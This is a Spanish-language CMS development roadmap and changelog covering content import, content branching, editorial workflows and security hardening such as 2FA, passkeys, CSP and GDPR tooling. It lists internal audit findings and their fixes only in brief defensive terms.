- [x] Tabla `imports` (workspaceId, source, status, fileKey, fileName, fileSize, mediaPolicy, mapping jsonb, stats jsonb, errorLog jsonb, dryRun, createdById, timestamps)
- [x] Tabla `import_items` (importId cascade, workspaceId, kind, sourceId, sourceUrl, status, targetId, error, timestamps + unique (importId,kind,sourceId))
- [x] `entries.originRef` text + unique partial index `(workspaceId, originRef) WHERE originRef IS NOT NULL` para idempotencia inter-lote
- [x] `npx drizzle-kit push --force` aplicado a Neon

#### Parsers (`src/imports/sources/`)
- [x] `wordpress.ts` — fast-xml-parser, posts + pages + comments approved + categorías/tags por `domain`
- [x] `notion.ts` — JSZip + extracción de propiedades `Key: value`, hex-id stripping, asset detection
- [x] `markdown.ts` — single .md o .zip; YAML frontmatter (title/slug/date/draft/status/tags/categories/excerpt/cover/author)
- [x] `ghost.ts` — JSON export con db[0].data, posts + tags + users + posts_tags
- [x] `rss.ts` — RSS 2.0 + Atom 1.0 unified
- [x] `csv.ts` — papaparse, headers dinámicos, mapeo manual
- [x] `registry.ts` con auto-detect por orden de especificidad (wp → rss → ghost → notion → markdown → csv)

#### Engine (`src/imports/engine.ts`)
- [x] `runImport(importId, opts)`: claim atómico de status, stream parser, normaliza, crea/actualiza entries por originRef, terms auto-create con cache, redirects via createRedirect (NO insert directo), comments linkeados a entries por sourceId
- [x] `applyMediaPolicy(doc, policy)`: skip → src="" siempre (incluso pasado el cap), link → no-op, download → safePublicFetch (anti-SSRF) + ingestUpload (cap 30 imgs/entry, cap 20MB/img, mime whitelist image/*)
- [x] `htmlToTiptap` + `markdownToTiptap` → Tiptap docs con `isSafeUrl()` aplicado a links e imágenes (bloqueo XSS via `javascript:`/`data:`/protocol-relative)
- [x] `sanitizeImportedFields()` — whitelist de claves trusted + reserved blocklist (`workspaceId`, `coverId`, `_origin`, `__proto__`, etc.) + prefix `import_*` para CSV columns
- [x] `stripDangerousChars()` — control chars en title/excerpt
- [x] Hard cap `MAX_ITEMS_PER_IMPORT = 50_000` anti-DoS
- [x] `revertImport()` — borra entries por importId (cascade comments/entryTerms/revisions)
- [x] Event bus in-memory `events.ts` (subscribe/emit/clearImport con buffer 200) + auto-cleanup tras 60s del complete

#### API (`src/app/api/admin/imports/`)
- [x] `POST /api/admin/imports` — multipart upload, mime+ext whitelist, magic-bytes detect, sube a storage con buildAssetKey, crea fila `uploaded`
- [x] `GET /api/admin/imports` — lista del workspace
- [x] `GET /api/admin/imports/[id]` — fila + import_items (200 últimos, filtro tenant defense-in-depth)
- [x] `PATCH /api/admin/imports/[id]` — actualizar mapping/mediaPolicy con cross-tenant check de collectionId
- [x] `DELETE /api/admin/imports/[id]` — borra fila + archivo storage
- [x] `POST /api/admin/imports/[id]/run` — claim atómico (UPDATE WHERE status IN allowed RETURNING) ANTES de `after()`, evita doble disparo
- [x] `POST /api/admin/imports/[id]/revert` — solo desde estado completed, borra entries cascade
- [x] `GET /api/admin/imports/[id]/stream` — SSE con heartbeat 15s + abort handling

#### UI (`src/app/admin/importar/`)
- [x] `/admin/importar` listing con cards de imports recientes, status tone, stats inline
- [x] `upload-zone.tsx` — dropzone full + 6 source-hint cards
- [x] `[id]/page.tsx` — server load fila + describe del archivo + collections + import_items
- [x] `[id]/wizard.tsx` — Step 2 (mapeo de campos), Step 3 (preview con sample real), Step 4 (run con SSE en vivo + revert + delete)
- [x] Sidebar: `/admin/importar` con icono Download

#### Auditoría F9a (subagent independiente)
Subagent encontró **1 CRITICAL + 5 HIGH + 9 MEDIUM + 7 LOW**. Fixeados los CRITICAL/HIGH/MEDIUM relevantes:

- [x] **CRITICAL: Race en runImport** — doble click podía disparar 2 engines en paralelo, ambos pasaban el SELECT inicial antes del UPDATE. Ambos iteraban, colisionaban en originRef unique, sobreescribían stats mutuamente. **Fix**: claim atómico en `/run` route con `UPDATE imports SET status='running' WHERE status IN ('uploaded','ready','failed') RETURNING` antes del `after()`. Si returning vacío → ya hay un caller running.
- [x] **HIGH: Open-redirect vía sourceUrl en imports** — el engine hacía `db.insert(redirects).values({...})` directamente, bypaseando `validateRule` + `isSafeDestination` + `isSelfReferential`. Atacante con un export WP/Ghost/RSS controlando `<link>` podía inyectar 301 desde `/admin/contenido` → `/<slug>` y secuestrar navegación interna. **Fix**: usar `createRedirect()` (que valida) + blacklist de prefijos reservados (`/admin`, `/api`, `/onboarding`, `/login`, `/miembros`, `/checkout`, etc.).
- [x] **HIGH: `entries.fields` clobber en re-import** — UPDATE replaceaba `fields` completo, perdiendo custom fields editados a mano por admin entre re-runs. **Fix**: SQL-side merge `coalesce(${entries.fields}, '{}'::jsonb) || ${json}::jsonb`.
- [x] **HIGH: Zip-bomb sin protección** — JSZip cargaba todo en RAM sin cap. .zip de 50MB descomprimía a 5GB → OOM en dyno. **Fix**: caps `MAX_FILE_BYTES=50MB`, `MAX_ZIP_ENTRIES=5000`, `MAX_TOTAL_UNCOMPRESSED=200MB` validados via `_data.uncompressedSize` ANTES de `file.async("string")`. Aplicado en notion.ts y markdown.ts.
- [x] **HIGH: `entries.fields` injection vía CSV columns** — el CSV parser persistía `{ ...row, _rowIndex }` directo, permitiendo al atacante meter claves como `coverId`, `authorId`, `workspaceId` que la UI futura podría leer. **Fix**: `sanitizeImportedFields()` con whitelist de claves trusted (wpPostType, notionAssets, ghostType, etc.) + RESERVED blocklist + prefix `import_*` para columnas desconocidas.
- [x] **MEDIUM: Excerpt+title sin strip de control chars** — RSS `<description>` puede traer HTML literal; control chars (0x00-0x1f) podrían poison search snippets. **Fix**: `stripDangerousChars()` aplicado a title y excerpt antes de persistir.
- [x] **MEDIUM: applyMediaPolicy bypass del cap en modo skip** — el check `>= MAX_MEDIA_PER_ENTRY` cortaba antes de aplicar `skip`, dejando imágenes 31+ con src original. UI prometía "borrar todas" pero mentía. **Fix**: `skip` siempre aplica src=""; el cap solo limita download (operación cara).
- [x] **MEDIUM: Timer leak en downloadMediaToWorkspace** — si `safePublicFetch` lanzaba antes del timeout, `clearTimeout` no corría → timer pendiente acumulándose en imports con muchos fallos. **Fix**: bloque `finally`.
- [x] **MEDIUM: Markdown.detect demasiado laxo** — cualquier `.zip` se etiquetaba como markdown si no era Notion. **Fix**: solo `.md.zip` o `markdown*.zip`; otros zips quedan en Notion.
- [x] **MEDIUM: Tenant filter ausente en importItems queries** — defense-in-depth contra cascading bugs futuros. **Fix**: añadido `eq(importItems.workspaceId, ws)` en revertImport y GET items.
- [x] **MEDIUM: Memory leak en events.ts buffer** — `clearImport` existía pero no se llamaba. **Fix**: `setTimeout(() => clearImport(id), 60_000)` tras último complete; `.unref()` para no bloquear el event loop.
- [x] **MEDIUM: stats.skipped nunca se incrementaba** — items "media standalone" y "term sin slug" pasaban como `imported`. **Fix**: nueva flag `result.skipped` que incrementa contador correcto + status `skipped` en import_items.

#### Diferidos a F10
- L1: revert no borra terms/redirects/media downloaded (residue). Requiere trackear targetIds por kind en import_items y borrar selectivamente. Funcional con re-import por originRef hace que terms huérfanos no estorben.
- L2: revert sin ownership check (cualquier editor puede revertir imports de otros editors). En workspace colaborativo es intencional pero mejorar con notificación al creador.
- L3: `[id]/page.tsx` re-corre `parser.describe(buf)` en cada GET (caro en imports grandes). Cachear en `imports.row` jsonb.
- L4: Magic-bytes validation en upload (actualmente confía en mime declarado del browser).
- L5: errorLog se sobreescribe al inicio del run en lugar de append.
- L6: `dryRun` re-run pierde stats anteriores.

### ✅ F9b — Content Branching (DONE)

> Branching estilo Git para contenido. Forkea, edita aislado, mergea con resolución 3-way por bloque.

#### Schema (drizzle-kit push --force aplicado)
- [x] Enum `branchStatus` ampliado con `merging` (claim atómico para merge anti-race)
- [x] Enum nuevo `entryBranchState` (`forked`/`new`/`deleted`) — sólo poblado cuando `entries.branchId IS NOT NULL`
- [x] Enum nuevo `branchActivityType` (17 valores: branch.created, branch.merged, entry.forked, comment.added, …)
- [x] Enum nuevo `branchCommentStatus` (`open`/`resolved`)
- [x] `branches` ampliada: slug, description, isDefault, isProtected, color, icon, previewToken, previewPasswordHash, previewExpiresAt, previewViews, createdById, mergedAt/By, abandonedAt/By, updatedAt
- [x] Indices: `branches_ws_slug_idx` (unique), `branches_ws_default_idx` (unique partial WHERE is_default=true), `branches_preview_token_idx` (unique partial), `branches_ws_status_idx`
- [x] `entries` ampliada: `originalEntryId` (FK self soft), `branchState`, `branchedFromUpdatedAt`
- [x] Indices entries: `entries_branch_original_idx` (unique partial — un solo COW por (branch, original)), `entries_ws_branch_idx`
- [x] Tabla `branch_activity` (workspaceId, branchId FK cascade, entryId soft, type, actorId, payload jsonb) + indices por branch+createdAt y entry
- [x] Tabla `branch_comments` (4 niveles de anchor: branch / entry / block / range) con threads (parentId self FK), mentions text[], status open/resolved
- [x] Backfill `scripts/backfill-main-branches.ts` — main creada por workspace existente (idempotente)
- [x] `src/db/seed.ts` actualizado para crear main al provisionar workspace

#### Library `src/branches/` (10 módulos)
- [x] `types.ts` — BRANCH_COOKIE, BRANCH_PREVIEW_COOKIE, BranchStats, BranchWithStats, ResolvedEntry
- [x] `lib.ts` — slugifyBranchName con `/` permitido, isValidBranchSlug, getOrCreateMainBranch, getBranchById/Slug, listBranches, listBranchesWithStats (3 queries agregadas), createBranch (auto-suffix slug), updateBranch, abandonBranch (bloqueo en main protegido), readActiveBranchCookie, resolveActiveBranch (fallback a main si abandoned/merged), listSwitchableBranches
- [x] `cow.ts` — materializeForkOnEdit (idempotente, slug COW prefijado `__b-<branchSlug>`, snapshot `branchedFromUpdatedAt`), markDeletedInBranch (hard-delete si state='new', tombstone si 'forked'), revertForkInBranch, createEntryInBranch, listEntriesForBranch (union main−COW), resolveEntryForBranch, listBranchConflicts (raw SQL con JOIN para `m.updated_at > e.branched_from_updated_at`), assertBranchInWorkspace, nonTombstoneFilter
- [x] `diff.ts` — snapshotBlocks (block-id estable: attrs.id o djb2(type+text+idx)), diffBlocks (added/removed/modified/unchanged por id), diffMeta (12 campos), diffEntry, diffSummary; inline word diff con `diff` package
- [x] `merge.ts` — buildMergePlan (clasifica items: promote/delete_main/create_in_main + isConflict), mergeBranch con claim atómico `UPDATE … WHERE status='draft' AND is_default=false RETURNING`, resoluciones per-fork (use_branch/use_main/skip), force option, releaseMerging on errors
- [x] `preview.ts` — generatePreviewToken (24 bytes base64url), hashPreviewPassword (sha256 con salt), rotatePreviewToken, clearPreviewToken, resolvePreviewBranch (4 estados: not-found/expired/password-required/wrong-password/branch-closed), bumpPreviewView
- [x] `activity.ts` — logBranchEvent best-effort, listBranchActivity con left join users
- [x] `comments.ts` — createBranchComment (parent validation cross-tenant, mentions sanitizadas), resolveBranchComment, deleteBranchComment, listBranchComments con author join
- [x] `index.ts` — re-export

#### API + Server actions
- [x] `src/app/admin/branches/_actions.ts` — 13 acciones: create, update, abandon, merge (admin role), rotate/clear preview token, switch/clear active branch (cookie), revert/delete entry in branch, comment CRUD (con role guards: viewer/editor/admin)
- [x] Helper Result<T> tipado para evitar `void` confuso
- [x] `/api/admin/branches` GET listing con stats
- [x] `/api/admin/branches/[id]` GET branch + entries + activity + comments
- [x] `/api/admin/branches/[id]/diff?entry=<id>` GET diff per-entry
- [x] `/api/admin/branches/[id]/preview` GET URL pública de preview

#### UI admin
- [x] `/admin/branches` listing — cards con color OKLCH, badges status, stats (forked/created/deleted/conflicts/openComments), main destacada en gradient
- [x] `create-branch-button.tsx` — modal con name+slug auto + descripción + 6 colores OKLCH
- [x] `/admin/branches/[id]` detalle — header con color, badges (status/protected/active), botones contextuales (Editar/Desactivar/Compartir/Mergear/Abandonar)
- [x] Listing entries con badges visibility (forked/new/deleted/main heredada) + conflict badge + diff inline expandible (block-by-block + meta)
- [x] MergeModal con UI de resolución per-conflict (use_branch/use_main/skip) + preview de auto-merge items
- [x] ShareModal con URL copiable, password opcional, expiración, contador de hits, rotate/clear
- [x] Activity tab con avatares + timeline + 17 tipos de eventos legibles en español
- [x] Comments tab con threads root, resolve, body multilinea
- [x] Sidebar: `/admin/branches` con icono GitBranch

#### Switcher + editor integration
- [x] `BranchSwitcher` en topbar — pill con color de branch, atajo `⌘B`, dropdown con todas las activas, link a /admin/branches
- [x] `ActiveBranchBanner` debajo del topbar cuando branch ≠ main — gradient color de branch + link de salida
- [x] Cookie `csm_branch` con scope `path: "/admin"`, `sameSite: "lax"`
- [x] `saveEntryAction` integrado: resuelve branch activa, materializeForkOnEdit cuando es necesario, devuelve `forkedToId` al cliente para redirect transparente
- [x] `editor-shell.tsx` redirige al COW id tras forkear (window.location)

#### Preview público read-only
- [x] `/preview/branch/[token]/layout.tsx` con `robots: noindex, nofollow, noarchive, nosnippet`
- [x] `/preview/branch/[token]/page.tsx` — listing de entradas en la branch con badges visibility, password form si protected, mensajes de error (expired / branch-closed)
- [x] `/preview/branch/[token]/[slug]/page.tsx` — entry render con renderDoc + sticky preview badge
- [x] `bumpPreviewView` best-effort sin bloquear response

#### Verificaciones
- [x] `npx tsc --noEmit` — 0 errores
- [x] `npx biome check src/branches src/app/admin/branches src/app/api/admin/branches src/app/preview src/components/admin/{branch-switcher,active-branch-banner}.tsx scripts/backfill-main-branches.ts` — 0 errores
- [x] `npm run build` — exitoso, todos los routes nuevos en bundle:
  - `/admin/branches` 7.32 kB / `/admin/branches/[id]` ~16 kB
  - `/api/admin/branches` + 3 sub-routes
  - `/preview/branch/[token]` 3.89 kB + `/preview/branch/[token]/[slug]` 176 B

#### Decisiones diferidas a F10
- L1: Branch protection avanzada (require N reviewers, require comments resolved before merge)
- L2: Restore de branch abandoned (UI de "papelera" con N días de retención)
- L3: Rebase explícito (traer cambios de main a la branch antes de merge — hoy se confía en force=true como bypass del check)
- L4: Branches anidadas (`baseBranchId` apunta a otra branch ≠ main) — schema lo permite, lógica de merge no lo aplica todavía
- L5: Notificaciones de @mentions en comments (la columna `mentions` se persiste pero no dispara emails)
- L6: Preview con vista mobile/tablet/desktop responsivo en mismo URL
- L7: Live-edit overlay sobre `/preview/branch/...` para editores logueados (interacción con F8c live-edit)
- L8: AB tests sobre branches (ej. publicar branch sólo a 10% del tráfico)

### ✅ F9c — Editorial OS (Calendar + Workflows + Notifications) (DONE)

> "Editorial OS" — calendar+kanban con DnD, asignaciones multi-rol, comentarios anclados a bloques con @mentions, bell SSE realtime, SLA cron, iCal feed, AI suggested slot, audit timeline, workflow templates por colección, bulk transitions.

#### Schema (drizzle-kit push --force aplicado)
- [x] Enum `entryStatus` ampliado con `"approved"` (entre review y scheduled)
- [x] Enums nuevos `entryPriority` (low/normal/high/urgent), `editorialAssignmentRole` (writer/reviewer/approver), `editorialThreadStatus` (open/resolved), `editorialEventType` (12 valores)
- [x] `entries` ampliada: `dueAt`, `priority`, `lockedForApprovalAt`, `lockedForApprovalById` (+ índices ws_scheduled, ws_due)
- [x] `collections.workflowConfig` (jsonb: requireReviewer/Approver, defaultSlaHours, skipReview, allowSelfApprove, etc.)
- [x] Tablas nuevas: `entry_assignments` (unique parcial activa por entry+role), `entry_workflow_events` (audit), `editorial_threads`+`editorial_messages` (mentions), `editorial_calendar_tokens` (iCal feed personal)

#### Library `src/editorial/` (9 módulos)
- [x] `types.ts` — enums + FORWARD_TRANSITIONS graph + EditorialNotificationType
- [x] `notifications.ts` — bus in-memory + SSE listeners + emit/list/markRead + dedup batch
- [x] `assignments.ts` — CRUD multi-tenant + claim atómico (UPDATE WHERE completedAt IS NULL) + workspace membership check + webhook emit
- [x] `workflow.ts` — `transitionStatus` con 7 guards (rol, forward graph, requireReviewer/Approver, scheduled futuro, lock approval atómico, skipReview, branch-publish-block)
- [x] `comments.ts` — threads + messages, mentions `@[name](userId)` validados contra members, reply auto-reabre resueltos
- [x] `sla.ts` — `effectiveDueAt`, `slaState` (ok/warning/breach), `sweepSlaBreaches` con dedup via workflow events
- [x] `calendar.ts` — `listCalendarItems` (5+ filtros, includeDue), `calendarHeatmap` por día
- [x] `ical.ts` — RFC 5545 compliant (foldLine 75 octetos, control char strip, escape) + tokens 24-byte rotables
- [x] `ai-schedule.ts` — `suggestSlots` basado en `analytics_events` últimos 90d (agrupa por dow+hour) con fallback heurístico

#### API + cron + server actions
- [x] `/api/admin/notifications` GET + `/mark-read` POST
- [x] `/api/admin/notifications/stream` SSE con heartbeat 25s + cleanup en send-failure
- [x] `/api/admin/calendar.ics?token=` con membership re-check + revocación automática si user dejó workspace
- [x] `/api/admin/ai/suggest-slot?count=` GET
- [x] `/api/cron/sla-breach` cada 15min (vercel.json)
- [x] `src/app/admin/workflows/_actions.ts` — 12 acciones (transition, assign, complete, remove, threads CRUD, reschedule, updateMeta, iCal token rotate)

#### UI admin
- [x] `/admin/calendario` mes/semana con DnD nativo (HTML5) a `scheduledAt`, heatmap por día, filtros sticky URL (collection/author/assignee/status/priority/includeDue), modal iCal subscribe con copy URL + rotate
- [x] `/admin/workflows` Kanban draft→review→approved→scheduled→published, drag entre cols dispara transition con guard server-side, bulk select + bulk transition, cards con avatars + SLA badge + priority dot
- [x] EditorialDrawer en `/admin/contenido/[id]` (3 tabs: Flujo / Comentarios / Historial) — workflow + assignees + AI suggest slot + threads con mentions autocomplete + audit timeline
- [x] Bell topbar con SSE realtime (auto-reconnect 5s), unread count, dropdown últimas 30, mark all/one read
- [x] Sidebar: Calendario y Workflows promovidos de "soon" a activos

#### Webhooks F7 ampliados
- [x] 5 eventos nuevos: `entry.review_requested`, `entry.approved`, `entry.rescheduled`, `entry.assigned`, `entry.unassigned`
- [x] Emit desde `transitionStatus`, `assignToEntry`, `removeAssignment`, `rescheduleEntryAction`

#### Auditoría capa 2 (subagent estrecho F9c)
Encontró **3 CRITICAL + 5 HIGH + 10 MEDIUM + 9 LOW**. Fixeados:
- [x] **C1: iCal feed sin membership check** — token sigue válido tras kick. Fix: validar `members(workspaceId, userId)` + auto-revoke si no es miembro.
- [x] **C2: iCal escapeIcal RFC non-compliant** — sin fold de líneas >75 octetos, sin strip de control chars. Fix: `stripControlChars` + `foldLine` UTF-8-aware.
- [x] **C3: SLA sweep eficiencia + correctness** — leía TODO el log de breach events sin filter. Fix: `WHERE assignmentId = ANY(ids)`.
- [x] **H2: transitionStatus permite approve/schedule/publish en branchId != NULL** — estado inconsistente (publicado pero no expuesto). Fix: bloquear con error `branch_publish_blocked`.
- [x] **H3: SSE listener Map leak en send-failure** — controllers caídos sin abort dejaban listeners eternos. Fix: send retorna bool, cleanup llamado en cada fallo.
- [x] **M1: notifyStatusChange/notifyComment sin filter ws en entries lookup** — defense-in-depth. Fix: `eq(entries.workspaceId, …)`.
- [x] **M4: reopenThread no insertaba audit event** — rompía timeline. Fix: insert workflow event `comment.added` con action=reopened.
- [x] **M7: lockedForApprovalAt no se libera si UPDATE final falla por race** — entry quedaba lockeada. Fix: liberar lock en branch de error si actor coincide.

#### Auditoría capa 3 (subagent amplio F0-F9c)
Encontró **4 CRITICAL + 5 HIGH + 11 MEDIUM + 5 LOW** cross-fase. Fixeados los prioritarios:
- [x] **C-1: Schemas Zod REST v1 sin "approved"** — `?status=approved` devolvía 400, response validation rompía. Fix: añadido a EntryResourceSchema/EntryCreateSchema/ListEntriesQuerySchema.
- [x] **C-2: GraphQL EntryStatus enum incompleto** — fallaba serialización al devolver entries approved. Fix: añadido al enum.
- [x] **C-3: Webhooks F7 sin eventos editoriales** — integraciones externas (Slack/n8n) ciegas a aprobaciones. Fix: 5 eventos nuevos + `emitAsync` desde workflow/assignments/reschedule.
- [x] **C-4: FK cascade borraba audit trail al merge** — eventos+assignments+threads del fork se perdían al `DELETE entries`. Fix: helper `transferEditorialAuditToMain` reapunta entryId al main antes del DELETE en los paths `use_main` y `promote`.
- [x] **H-1: SDK `csm.entries.list({ status })` sin "approved"** — rompía typing. Fix: añadido al union.
- [x] **H-2: StatusTabs y posts-table sin tab/badge "approved"** — entries quedaban invisibles desde listado clásico. Fix: añadido tab "Aprobados" y badge azul.
- [x] **H-4: rescheduleEntryAction y updateEntryMetaAction no filtraban branchId** — permitían mutar metadata en forks sin pasar por COW. Fix: `isNull(entries.branchId)` en lookup y UPDATE.
- [x] **H-5: transitionStatus no chequea branch ↔ entry.branchId** — cubierto parcialmente por bloqueo approved/scheduled/published.

#### Decisiones diferidas a F10
- L1 SSE in-memory bus + Vercel Fluid Compute: notifications no fanout cross-instancia. F10 → Redis pub/sub o Postgres LISTEN/NOTIFY.
- L2 Workload del calendar incluye assignments en forks (M-4 cross-fase): pendiente filter `isNull(entries.branchId)` en query workload de `/admin/calendario`.
- L3 SLA sweep no filtra `branchId IS NULL` (M-8): assignments en forks emiten breaches.
- L4 `listEntryEvents` sin paginar (M-9): timeline de entries con miles de eventos carga todo. Paginar a 50.
- L5 Calendar y Workflows sin paginación cursor para WS con >5k entries (M-10).
- L6 Live-edit (F8c) no respeta `lockedForApprovalAt`: hoy sólo afecta pages, sin workflow.
- L7 Mentions notifications cross-instancia: ver L1.
- L8 Workflow templates UI por colección: backend listo (`workflowConfig` jsonb), falta UI editor en `/admin/colecciones/[id]`.
- L9 Bulk transitions sin throttle: serializa N actions, UX pesada con muchos items.
- L10 `editorialCalendarTokens` revoke endpoint explícito (hoy solo rotación): endpoint dedicated `revoke`.
- L11 `Notification` type colisiona con global `window.Notification` si import en cliente.

## Fase 10 — Production-Ready ✦ Edición Espectacular ✦ Único en 2026

> Lema: **"De CMS funcional a producto único en el mercado."** F10 transforma CSM en algo que ningún competidor open-source ofrece hoy: enterprise-grade security + edición colaborativa realtime + MCP server nativo + AI Agent editorial autónomo + PWA offline + observabilidad propia.
>
> **Tres diferenciadores que NADIE más combina hoy (2026-05):**
> 1. **MCP Server nativo del CMS** → cualquier agente IA (Claude Desktop / Cursor / IDE) gestiona contenido como tool. Único en el espacio CMS open-source.
> 2. **AI Agent editorial durable** (Vercel Workflow) → "publica 3 posts esta semana sobre X" → research, draft, SEO, schedule, OG, notify reviewers — autónomo, crash-safe.
> 3. **Realtime collab self-hostable** (Y.js + presence + cursors) sobre CMS open-source → Sanity Live es hosted; Notion no es CMS; nadie más lo combina.

### F10a — Seguridad Enterprise + Compliance
> Foundational. Sin esto no se puede decir "production-ready". Resuelve los huecos abiertos en F0-F9.

#### Parte 1 (entregada 2026-05-04) ✅
- [x] **2FA TOTP** — wizard `/admin/ajustes/seguridad/2fa` (intro → verify → done) con QR (`qrcode.react`), backup codes (descarga txt + copy), regenerar backup codes con password. Plugin `twoFactor` de Better-Auth (ya cableado).
- [x] **Sesiones revocables + lista de dispositivos** — `/admin/ajustes/seguridad/sesiones` con UA parsing (`ua-parser-js`), IP enmascarada (a.b.c.x / v6 trunc), badge "Esta sesión", revoke individual + "Cerrar todas las demás". Usa `auth.api.listSessions` + `authClient.revokeSession`.
- [x] **Passkeys (WebAuthn)** — implementación custom con `@simplewebauthn/server` (Better-Auth 1.2 no incluye plugin). Helpers en `src/auth/passkeys.ts`, rutas `/api/admin/passkeys/{register-options,register-verify,[id]}`, UI `/admin/ajustes/seguridad/passkeys` con listado + add + rename inline + delete. Reusa tabla `passkeys` (schema F0) y `verifications` para challenges efímeros (TTL 5min, single-use).
- [x] **Centro de Seguridad** `/admin/ajustes/seguridad` con 4 cards (estado 2FA, passkeys count, sesiones count, email verificado) + tips.
- [x] **Layout Ajustes** con sub-nav (Perfil / Seguridad / Privacidad / Notificaciones / API). Sidebar admin: removida flag "soon" de Ajustes.

#### Parte 2 — bloque 1 (entregado 2026-05-04) ✅
- [x] **Login flow con 2FA**: `/login/2fa` con tabs TOTP (6 dígitos) / código de recuperación (alphanumérico). `login-form.tsx` detecta `result.data.twoFactorRedirect` tras `signIn.email` y redirige preservando `?next=` query param. `verifyTotp` y `verifyBackupCode` con manejo de errores (mensaje "INVALID" → "código incorrecto" / "ya usado").

#### Parte 2 — bloque 2 (entregado 2026-05-04) ✅
- [x] **Login con passkey** — botón "Iniciar con passkey" en /login con resident credential (sin email previo). Endpoints `/api/auth/passkey/login-options` (POST, sin auth) y `/api/auth/passkey/login-verify` (POST, sin auth). Resuelve userId por `credentialID`, mintea sesión Better-Auth-compatible (token random + HMAC-SHA-256 sobre `AUTH_SECRET` + cookie `csm.session_token` o `__Secure-csm.session_token` en prod). Audit log `passkey.login_success` con `meta.source: "passkey"`.
- [x] **Bug fix passkeys.ts** — el verify de resident credential no encontraba el challenge porque `takeChallenge(prefix, "")` usaba string vacío. Ahora extrae `challenge` desde `clientDataJSON` (base64url) en `extractClientDataChallenge` y lo usa como key, alineado con cómo `generatePasskeyAuthenticationOptions` lo guarda.
- [x] **Email verification obligatorio para paid** — Better-Auth `emailVerification` config con `sendVerificationEmail` callback (Resend en prod, console.log en dev). Página `/admin/ajustes/perfil` con `<ProfileEmailVerification>` (banner verde si verificado, banner ámbar + CTA resend si no). Helper `requireVerifiedEmailForPaidPlan(userId)` en `src/auth/email-verification.ts` para gates futuros (return `{ok, reason}` para que el caller decida UI). Política: free libre, paid + GDPR export + alertas críticas exigen verificación.
- [x] **Rate limit en login con UI lockout** — Better-Auth `rateLimit` config con `storage: "database"` (tabla `rate_limits` nueva en schema, key/count/lastRequest). Reglas custom: `/sign-in/email` 5/60s, `/two-factor/verify-totp` 5/60s, `/two-factor/verify-backup-code` 10/60s, `/sign-in/magic-link` 3/60s, `/send-verification-email` 3/60s, default 60/60s. Mini-rate-limiter standalone `src/auth/rate-limit.ts` reusa la misma tabla para endpoints custom (`passkey-login-options` 20/60s, `passkey-login-verify` 10/60s). UI: banner countdown con segundos restantes, botones disabled durante lockout, parsing de `Retry-After` header desde Better-Auth y desde nuestros endpoints.

#### GDPR / Privacidad
- [x] **Cookies banner con consent granular** — `src/components/cookie-consent.tsx` montado en root layout. 3 opciones (necesarias siempre on / analytics / marketing). Persiste en cookie `csm_consent` (1 año, JSON con version) y dispatcha `csm:consent-change` para que componentes opt-in (analytics scripts) puedan engancharse vía `useConsent()`.
- [x] **Páginas legales** — `/legal/privacidad`, `/legal/cookies`, `/legal/terminos` con layout compartido. Cumple RGPD (UE 2016/679 + LO 3/2018).
- [x] **Export usuario completo** (entregado 2026-05-04) — `/api/admin/privacy/export` devuelve ZIP con `user.json` + `sessions.json` (IPs hasheadas) + `workspaces.json` + `entries.json` + `comments.json` + `passkeys.json` (sólo metadata) + `api-keys.json` (sin secrets) + `activity-log.json` (últimos 1000) + `README.txt` que explica el contenido y lo que NO incluye. JSZip ya estaba en deps. Cumple RGPD art. 20 (portabilidad).
- [x] **Derecho al olvido** (entregado 2026-05-04) — schema añadió `users.deletionRequestedAt` + `users.deletedAt` con índice. Página `/admin/ajustes/privacidad` con sección destacada en rojo + double-confirm (escribir "ELIMINAR"). Banner de countdown si ya solicitada con fecha de purge formateada en español. Botón "Cancelar eliminación" disponible durante todo el grace period. Cron diario `/api/cron/daily` extendido con `purgeExpiredDeletions()` que hard-deletea (FK cascade limpia el resto). Constants `DELETION_GRACE_DAYS = 30`.
- [ ] **Anonimización IP** en activity_log y analytics_events (ya parcial; auditar).

#### CSP + Headers de seguridad
- [x] **CSP con nonces (Report-Only)** — `src/lib/security-headers.ts` (buildCsp/buildPermissionsPolicy/applySecurityHeaders/generateNonce), wired en `src/middleware.ts`. Nonce per-request expuesto vía `x-nonce` request header. Whitelist Stripe/UploadThing/Resend/Replicate/Vercel Blob/avatares OAuth.
- [x] **Permissions-Policy** — bloqueo de camera/geolocation/usb/midi/etc; permitido microphone(self) para voice-to-content, payment(self) para Stripe.
- [x] **HSTS** activo en prod sobre https (`max-age=31536000; includeSubDomains`, preload off por seguridad), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: SAMEORIGIN`.
- [x] **CSP report endpoint** `/api/security/csp-report` — log a stdout v1 (F10d → tabla `csp_reports` + dashboard).
- [ ] Cambio a `enforce` cuando los reports estén limpios + UI dashboard `/admin/ajustes/seguridad/headers`.

#### Anti-bot / spam
- [ ] **Vercel BotID** integrado en forms públicos + comments + newsletter signup (GA junio 2025, free, sin captcha visible). Sustituye honeypot como defensa primaria.
- [ ] **Cloudflare Turnstile** opcional como fallback configurable por workspace.
- [ ] AI moderation score de comments ya existe → ahora bloquea según threshold por workspace.

#### Branch protection avanzada (cierra F9b L1)
- [ ] `branches.protectionConfig` jsonb: `{ requireReviewers: number, requireCommentsResolved: boolean, requireApprovers: number }`.
- [ ] Merge bloqueado si protección no satisfecha; UI muestra checklist de blockers.
- [ ] Audit event `branch.protection.changed`.

#### Parte 2 bloque 3 (entregado 2026-05-04) ✅ — Hardening final
- [x] **Whitelist URLs registry** — `safeUrlNullable()` aplicado a IMAGE.src/GALLERY items.src/HERO.image/SECTION.backgroundImage/TESTIMONIALS items.avatar. Nuevo helper `src/lib/safe-url.ts::httpUrlSchema()` (http(s)-only) aplicado a webhooks, ogImage (entries+pages), menus external, uploads-by-URL.
- [x] **Anonimización IP** — `src/lib/ip-anon.ts` (`anonymizeIp` truncate v4 last octet / v6 /48). Better-Auth `databaseHooks.session.create.before` antes del INSERT. Backfill defensivo en cron daily (`/api/cron/daily`). `mintSession` (passkey login custom) también aplica.
- [x] **CSP enforce + dashboard reports** — Tabla `csp_reports` con dedupKey SHA-256 + UPSERT. Endpoint `/api/security/csp-report` parsea legacy + Reporting API. Header `Reporting-Endpoints` + `report-uri`/`report-to` en CSP. Dashboard `/admin/ajustes/seguridad/headers` con tabla agrupada por directiva, detalle últimos 50, resolve por directiva o por reporte. Toggle enforce con env `CSP_ENFORCE=1`.
- [x] **BotID + Turnstile + hCaptcha** — Helper unificado `src/lib/anti-bot.ts::verifyAntiBot()` con dynamic import de `@vercel/botid`. Integrado en `/api/public/subscribe` y `/api/comentarios`. UI `/admin/ajustes/seguridad/anti-spam` con estado por provider + envHints.
